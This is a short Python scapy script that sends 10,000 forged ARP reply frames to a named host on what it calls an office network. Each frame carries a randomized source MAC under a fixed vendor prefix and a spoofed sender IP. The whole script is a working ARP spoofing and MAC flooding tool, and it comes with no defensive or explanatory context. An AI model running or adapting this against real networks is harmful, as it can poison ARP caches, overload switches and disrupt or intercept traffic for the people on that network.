#!/usr/bin/env python
from scapy.all import *

vendor = "b8:e8:56:"
destMAC = "FF:FF:FF:FF:FF:FF"

# use a host in the same net
destMAC = "F8:34:41:5D:42:47" # random host in office network

cnt = 0
while 1:
    randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
    print randMAC
    sendp(Ether(src=randMAC ,dst=destMAC)/
    ARP(op=2, psrc="11.22.33.44", hwdst=destMAC)/Padding(load="X"*18),verbose=0)
    cnt += 1
    if cnt == 10000:
        break

